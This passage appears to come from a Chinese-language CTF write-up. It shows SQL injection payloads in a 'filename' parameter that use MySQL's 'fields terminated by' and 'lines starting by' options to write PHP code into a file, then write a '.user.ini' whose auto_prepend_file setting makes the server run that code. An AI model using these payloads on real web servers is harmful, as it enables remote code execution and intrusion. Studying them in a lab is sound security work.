...
```sql
filename=happy'fields terminated by '<?php phpinfo();?>'#
```

写`.user.ini`，需要考虑到，上一题的php代码都是添加在了某个字段末尾或者某行的末尾。这样`.user.ini`会出现语法错误，可以把`.user.ini`的关键语句在一行的开头，用分号注释掉不需要的行

在sql语句里，提供了`lines starting by';'`，可以指定行开头，和上面的语句配合使用太完美了

```sql
filename=.user.ini'lines starting by';'fields terminated by 'auto_prepend_file=happy'#
```
